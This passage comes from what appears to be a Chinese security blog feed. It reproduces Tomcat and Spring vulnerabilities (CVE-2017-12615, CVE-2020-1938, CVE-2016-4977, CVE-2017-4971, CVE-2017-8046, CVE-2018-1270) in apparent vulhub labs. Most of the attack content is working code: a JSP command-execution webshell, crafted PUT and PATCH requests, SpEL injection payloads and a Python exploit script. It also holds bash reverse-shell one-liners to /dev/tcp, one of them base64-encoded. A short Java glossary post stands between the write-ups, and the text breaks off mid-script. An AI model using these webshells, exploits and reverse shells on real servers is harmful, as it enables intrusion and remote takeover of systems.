拥有text接口权限</span><br></pre></td></tr></table></figure><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手动修改了这些属性的情况下，才可以进行攻击。</p><h3 id="2、漏洞复现"><a href="#2、漏洞复现" class="headerlink" title="2、漏洞复现"></a>2、漏洞复现</h3><p>1、弱口令<code>tomcat:tomcat</code>访问后台</p><p><img src="/img/VulnRep-Tomcat/image-20240524144345487.png" alt="image-20240524144345487"></p><p>2、上传webshell</p><p>将如下shell.jsp 压缩成zip，再修改后缀为war</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;pre&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;/pre&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Tomcat/image-20240524144716290.png" alt="image-20240524144716290"></p><p>3、执行命令</p><p><img src="/img/VulnRep-Tomcat/image-20240524144805697.png" alt="image-20240524144805697"></p><h2 id="二、PUT方法写入任意文件（CVE-2017-12615）"><a href="#二、PUT方法写入任意文件（CVE-2017-12615）" class="headerlink" title="二、PUT方法写入任意文件（CVE-2017-12615）"></a>二、PUT方法写入任意文件（CVE-2017-12615）</h2><h3 id="1、漏洞原因-1"><a href="#1、漏洞原因-1" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>该版本Tomcat配置了可写（readonly&#x3D;false），导致我们可以往服务器写文件</p><h3 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Apache Tomcat 7.0.0 - 7.0.81</p><h3 id="3、漏洞复现"><a href="#3、漏洞复现" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><p><img src="/img/VulnRep-Tomcat/image-20240524145153634.png" alt="image-20240524145153634"></p><p>2、抓包修改请求为PUT</p><p>后台对文件后缀还是有一定限制的，此处利用linux特性，在文件名后缀加上&#x2F; 即可绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PUT /shell.jsp/ HTTP/1.1</span><br><span class="line">Host: 81.70.248.223:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;pre&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;/pre&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Tomcat/image-20240524145600653.png" alt="image-20240524145600653"></p><p>3、执行命令</p><p><img src="/img/VulnRep-Tomcat/image-20240524145644511.png" alt="image-20240524145644511"></p><h2 id="三、文件包含漏洞（CVE-2020-1938）"><a href="#三、文件包含漏洞（CVE-2020-1938）" class="headerlink" title="三、文件包含漏洞（CVE-2020-1938）"></a>三、文件包含漏洞（CVE-2020-1938）</h2><h3 id="1、漏洞原因-2"><a href="#1、漏洞原因-2" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Tomcat默认开启AJP服务（8009端口），存在一处文件包含缺陷。攻击者可以通过构造的恶意请求包来进行文件包含操作，从而读取或包含Tomcat上所有webapp目录下的任意文件，如：webapp配置文件或源代码等。如果此时还存在文件上传功能，则可能会导致代码执行。</p><p>tomcat默认的conf&#x2F;server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip。</p><h3 id="2、影响版本-1"><a href="#2、影响版本-1" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>Apache Tomcat 6</li><li>Apache Tomcat 7 &lt; 7.0.100</li><li>Apache Tomcat 8 &lt; 8.5.51</li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><p>不受影响版本：</p><ul><li>Apache Tomcat 7.0.10034</li><li>Apache Tomcat 8.5.5134</li><li>Apache Tomcat 9.0.3134</li></ul><h3 id="3、漏洞复现-1"><a href="#3、漏洞复现-1" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、可用nmap 扫这两个端口</p><p><img src="/img/VulnRep-Tomcat/image-20240524151619712.png" alt="image-20240524151619712"></p><p>2、漏洞复现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</span><br><span class="line">cd CNVD-2020-10487-Tomcat-Ajp-lfi/</span><br><span class="line">chmod +x CNVD-2020-10487-Tomcat-Ajp-lfi.py</span><br><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.9 -p 8009 -f WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Tomcat/image-20240524152014946.png" alt="image-20240524152014946"></p><p>此靶场无文件上传的功能，可以手动进入容器中写入一个webshell，之后包含，即可getshell。</p>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【基础知识】Java相关名词</title>
      <link href="/2024/05/23/Nouns-Java/"/>
      <url>/2024/05/23/Nouns-Java/</url>
      
        <content type="html"><![CDATA[<h1 id="Java相关名词"><a href="#Java相关名词" class="headerlink" title="Java相关名词"></a>Java相关名词</h1><h2 id="一、Java-开发名词"><a href="#一、Java-开发名词" class="headerlink" title="一、Java 开发名词"></a>一、Java 开发名词</h2><p>Java 2 标准版（J2SE） 桌面，java基础及其核心，主要开发桌面程序或控制程序。</p><p>Java 2 移动版（J2ME）移动端、手机，嵌入式开发。</p><p>Java 2 企业版（J2EE）企业版、服务器，web端开发。</p><h2 id="二、Java-跨平台"><a href="#二、Java-跨平台" class="headerlink" title="二、Java 跨平台"></a>二、Java 跨平台</h2><p>JVM : 实现真正的可移植性，只要安装了JVM的地方都可以运行Java程序。</p><h2 id="三、Java-工具"><a href="#三、Java-工具" class="headerlink" title="三、Java 工具"></a>三、Java 工具</h2><p>构建工具：Maven、Jekins、Ant</p><p>应用服务器：Tomcat、Jetty、Jboss、Websphere、Weblogic</p><p>Web开发：struts2、spring、myBatis</p><p>Hadoop 大数据领域 、Android 手机端</p><p>Java动态性–&gt;反射 ，大多框架基本都基于反射</p><p>JDK :Java Development Kit Java开发者工具</p><p>JRE: Java Runtime Environment Java运行环境</p><p>JVM : Java Virtual Machine Java虚拟机</p><p>JDK包含JRE包含JVM。Java、Javac编译运行Java程序，Javadoc可以生成doc文档，jar可以生成.jar的应用程序。</p><p>运行Java程序需要JRE环境，程序运行时会在JVM中运行，所以实现了Java的可移植性。java类初始化的时候调用java.lang.ClassLoader加载字节码文件。</p><h2 id="四、JDK-的目录"><a href="#四、JDK-的目录" class="headerlink" title="四、JDK 的目录"></a>四、JDK 的目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bin : 存放Java运行工具，如javac.exe、jar.exe</span><br><span class="line">inclue : 因为Java是c、c++语言编写的，这里存放了很多需要引用的c库</span><br><span class="line">jre : Java运行所需环境，包含JVM</span><br><span class="line">lib : Java类库</span><br><span class="line">src.zip : 资源文件，放了很多Java类的源代码</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】Spring 系列漏洞复现（全漏洞版本）</title>
      <link href="/2024/05/23/VulnRep-Spring/"/>
      <url>/2024/05/23/VulnRep-Spring/</url>
      
        <content type="html"><![CDATA[<h1 id="【漏洞复现】Spring-系列漏洞复现（全漏洞版本）"><a href="#【漏洞复现】Spring-系列漏洞复现（全漏洞版本）" class="headerlink" title="【漏洞复现】Spring 系列漏洞复现（全漏洞版本）"></a>【漏洞复现】Spring 系列漏洞复现（全漏洞版本）</h1><h2 id="零、Spring-框架简介"><a href="#零、Spring-框架简介" class="headerlink" title="零、Spring 框架简介"></a>零、Spring 框架简介</h2><p>Spring 是一个开源的Java 平台，用于企业级Java 应用开发。Spring 框架因其灵活性、易用性和强大的社区支持而广受好评，是构建企业级Java 应用的首选框架之一。</p><h2 id="一、Spring-Security-OAuth2-远程代码执行RCE漏洞（CVE-2016-4977）"><a href="#一、Spring-Security-OAuth2-远程代码执行RCE漏洞（CVE-2016-4977）" class="headerlink" title="一、Spring Security OAuth2 远程代码执行RCE漏洞（CVE-2016-4977）"></a>一、Spring Security OAuth2 远程代码执行RCE漏洞（CVE-2016-4977）</h2><h3 id="1、漏洞原因"><a href="#1、漏洞原因" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Spring Security OAuth2 是Spring框架中提供安全认证支持的一个模块。在处理请求过程中如果使用了whitelabel视图，response_type参数值会被当做Spring SpEL来执行，进而造成SpEL注入。攻击者通过构造<code>response_type</code>值可以触发远程代码执行漏洞。</p><h3 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>Spring Security OAuth 2.0到2.0.14</li><li>Spring Security OAuth 2.1到2.1.1</li><li>Spring Security OAuth 2.2到2.2.1</li><li>Spring Security OAuth 2.3到2.3.2</li></ul><h3 id="3、漏洞复现"><a href="#3、漏洞复现" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、靶场首页</p><p><img src="/img/VulnRep-Spring/image-20240521173035003.png" alt="image-20240521173035003"></p><p>2、访问<code>/oauth/authorized</code></p><p>默认账号密码：<code>admin:admin</code></p><p><img src="/img/VulnRep-Spring/image-20240521174542972.png" alt="image-20240521174542972"></p><p>3、添加请求参数response_type</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/oauth/authorize?response_type=$&#123;2*3&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240521174848661.png" alt="image-20240521174848661"></p><p>4、上POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">message = input(&#x27;Enter message to encode:&#x27;)</span><br><span class="line">poc = &#x27;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#x27; % ord(message[0])</span><br><span class="line">for ch in message[1:]:</span><br><span class="line">   poc += &#x27;.concat(T(java.lang.Character).toString(%s))&#x27; % ord(ch) </span><br><span class="line"></span><br><span class="line">poc += &#x27;)&#125;&#x27;</span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240521175616193.png" alt="image-20240521175616193"></p><h2 id="二、Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）"><a href="#二、Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）" class="headerlink" title="二、Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）"></a>二、Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</h2><h3 id="1、漏洞原因-1"><a href="#1、漏洞原因-1" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p><p>在订阅酒店功能处，存在一个命令执行，直接调用了两个函数，这两个函数，一个是：addDefaultMappings ,一个是 addModelBindings。其中，直接控制field这个值的函数是addDefaultMappings，且未做过滤，而addModelBindings是直接获取的java的一个配置文件，由配置文件来确定是否有 binder 节点，如果有，就无法触发代码执行。</p><p>所以漏洞条件有两个：</p><ol><li>binder节点为空；</li><li>useSpringBeanBinding 默认值（false）未修改。</li></ol><h3 id="2、影响版本-1"><a href="#2、影响版本-1" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Spring WebFlow 2.4.0 - 2.4.4</p><h3 id="3、漏洞复现-1"><a href="#3、漏洞复现-1" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><p><img src="/img/VulnRep-Spring/image-20240522134021757.png" alt="image-20240522134021757"></p><p>2、点击左上角进行登陆</p><p>用给的账号密码进行登陆</p><p><img src="/img/VulnRep-Spring/image-20240522134136178.png" alt="image-20240522134136178"></p><p>3、访问<code>hotels/1</code> 的酒店</p><p><img src="/img/VulnRep-Spring/image-20240522134433756.png" alt="image-20240522134433756"></p><p><img src="/img/VulnRep-Spring/image-20240522134552636.png" alt="image-20240522134552636"></p><p>抓包<code>Confirm</code>的POST请求。由于是存在token 的，所以这里使用重放是无法复现的，需要现抓改包</p><p><img src="/img/VulnRep-Spring/image-20240522134638988.png" alt="image-20240522134638988"></p><p>4、上POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//1、创建文件</span><br><span class="line">&amp;_(new+java.lang.ProcessBuilder(&quot;touch&quot;,&quot;/tmp/1.txt&quot;)).start()=vulhub</span><br><span class="line"></span><br><span class="line">//2、反弹shell</span><br><span class="line">&amp;_(new+java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/x.x.x.x/4444+0&gt;%261&quot;)).start()=vulhub</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240522135429106.png" alt="image-20240522135429106"></p><p>进容器查看</p><p><img src="/img/VulnRep-Spring/image-20240522135555083.png" alt="image-20240522135555083"></p><h2 id="三、Spring-Data-Rest-远程命令执行漏洞（CVE-2017-8046）"><a href="#三、Spring-Data-Rest-远程命令执行漏洞（CVE-2017-8046）" class="headerlink" title="三、Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）"></a>三、Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）</h2><h3 id="1、漏洞原因-2"><a href="#1、漏洞原因-2" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Spring Data REST 服务器在处理 PATCH 请求时，攻击者可以构造恶意的 JSON 格式的 PATCH 请求并发送给spring-date-rest 服务器，来执行恶意的Java代码。</p><h3 id="2、影响版本-2"><a href="#2、影响版本-2" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>Spring Data REST 版本 &lt; 2.5.12、 2.6.7、 3.0 RC3</li><li>Spring Boot 版本 &lt; 2.0.0M4</li><li>Spring Data release trains Kay-RC3 之前的版本</li></ul><h3 id="3、漏洞复现-2"><a href="#3、漏洞复现-2" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><p><img src="/img/VulnRep-Spring/image-20240522142110867.png" alt="image-20240522142110867"></p><p>2、漏洞点在<code>/customers/1</code></p><p><img src="/img/VulnRep-Spring/image-20240522142308657.png" alt="image-20240522142308657"></p><p>3、抓包上POC</p><p>需要把要执行的命令转成ASCII，这里借助python脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Payload to ASCII</span><br><span class="line">payload = b&#x27;touch /tmp/shell.txt&#x27;</span><br><span class="line">bytecode = &#x27;,&#x27;.join(str(i) for i in list(payload))</span><br><span class="line">print(bytecode)</span><br></pre></td></tr></table></figure><p>修改数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PATCH /customers/1 HTTP/1.1</span><br><span class="line">Host: xxx.xxx.xxx.xxx:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">If-None-Match: &quot;0&quot;</span><br><span class="line">If-Modified-Since: Wed, 22 May 2024 06:13:21 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json-patch+json</span><br><span class="line">Content-Length: 209</span><br><span class="line"></span><br><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,104,101,108,108,46,116,120,116&#125;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240522143442157.png" alt="image-20240522143442157"></p><p>反弹shell 的POC，可讲命令替换成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMTEuNTUuNS82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><h2 id="四、Spring-Messaging-远程命令执行漏洞（CVE-2018-1270）"><a href="#四、Spring-Messaging-远程命令执行漏洞（CVE-2018-1270）" class="headerlink" title="四、Spring Messaging 远程命令执行漏洞（CVE-2018-1270）"></a>四、Spring Messaging 远程命令执行漏洞（CVE-2018-1270）</h2><h3 id="1、漏洞原因-3"><a href="#1、漏洞原因-3" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>spring messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS，在spring messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用<code>StandardEvaluationContext</code>解析，造成命令执行漏洞。</p><h3 id="2、影响版本-3"><a href="#2、影响版本-3" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>Spring Framework 5.0 到 5.0.4 </li><li>Spring Framework 4.3 到 4.3.14</li></ul><h3 id="3、漏洞复现-3"><a href="#3、漏洞复现-3" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><p><img src="/img/VulnRep-Spring/image-20240523155822790.png" alt="image-20240523155822790"></p><p>2、上exp</p><p>创建<code>/tmp/1.txt</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">import logging</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO)</span><br><span class="line"></span><br><span class="line">def random_str(length):</span><br><span class="line">    letters = string.ascii_lowercase + string.digits</span><br><span class="line">    return &#x27;&#x27;.join(random.choice(letters) for c in range(length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SockJS(threading.Thread):</span><br><span class="line">    def __init__(self, url, *args, **kwargs):</span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line">        self.base = f&#x27;&#123;url&#125;/&#123;random.randint(0, 1000)&#125;/&#123;random_str(8)&#125;&#x27;</span><br><span class="line">        self.daemon = True</span><br><span class="line">        self.session = requests.session()</span><br><span class="line">        self.session.headers = &#123;</span><br><span class="line">            &#x27;Referer&#x27;: url,</span><br><span class="line">            &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        self.t = int(time.time()*1000)</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        url = f&#x27;&#123;self.base&#125;/htmlfile?c=_jp.vulhub&#x27;</span><br><span class="line">        response = self.session.get(url, stream=True)</span><br><span class="line">        for line in response.iter_lines():</span><br><span class="line">            time.sleep(0.5)</span><br><span class="line">    </span><br><span class="line">    def send(self, command, headers, body=&#x27;&#x27;):</span><br><span class="line">        data = [command.upper(), &#x27;\n&#x27;]</span><br><span class="line"></span><br><span class="line">        data.append(&#x27;\n&#x27;.join([f&#x27;&#123;k&#125;:&#123;v&#125;&#x27; for k, v in headers.items()]))</span><br><span class="line">        </span><br><span class="line">        data.append(&#x27;\n\n&#x27;)</span><br><span class="line">        data.append(body)</span><br><span class="line">        data.append(&#x27;\x00&#x27;)</span><br><span class="line">        data = json.dumps([&#x27;&#x27;.join(data)])</span><br><span class="line"></span><br><span class="line">        response = self.session.post(f&#x27;&#123;self.base&#125;/xhr_send?t=&#123;self.t&#125;&#x27;, data=data)</span><br><span class="line">        if response.status_code != 204:</span><br><span class="line">            logging.info(f&quot;send &#x27;&#123;command&#125;&#x27; data error.&quot;)</span><br><span class="line">        else:</span><br><span class="line">            logging.info(f&quot;send &#x27;&#123;command&#125;&#x27; data success.&quot;)</span><br><span class="line"></span><br><span class="line">    def __del__(self):</span><br><span class="line">        self.session.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sockjs = SockJS(&#x27;http://your-ip:8080/gs-guide-websocket&#x27;)</span><br><span class="line">sockjs.start()</span><br><span class="line">time.sleep(1)</span><br><span class="line"></span><br><span class="line">sockjs.send(&#x27;connect&#x27;, &#123;</span><br><span class="line">    &#x27;accept-version&#x27;: &#x27;1.1,1.0&#x27;,</span><br><span class="line">    &#x27;heart-beat&#x27;: &#x27;10000,10000&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">sockjs.send(&#x27;subscribe&#x27;, &#123;</span><br><span class="line">    &#x27;selector&#x27;: &quot;T(java.lang.Runtime).getRuntime().exec(&#x27;touch /tmp/1.txt&#x27;)&quot;,</span><br><span class="line">    &#x27;id&#x27;: &#x27;sub-0&#x27;,</span><br><span class="line">    &#x27;destination&#x27;: &#x27;/topic/greetings&#x27;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">data = json.dumps(&#123;&#x27;name&#x27;: &#x27;vulhub&#x27;&#125;)</span><br><span class="line">sockjs.send(&#x27;send&#x27;, &#123;</span><br><span class="line">    &#x27;content-length&#x27;: len(data),</span><br><span class="line">    &#x27;destination&#x27;: &#x27;/app/hello&#x27;</span><br><span class="line">&#125;, data)</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523160413486.png" alt="image-20240523160413486"></p><p>反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">from asyncio.constants import LOG_THRESHOLD_FOR_CONNLOST_WRITES</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">import logging</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span 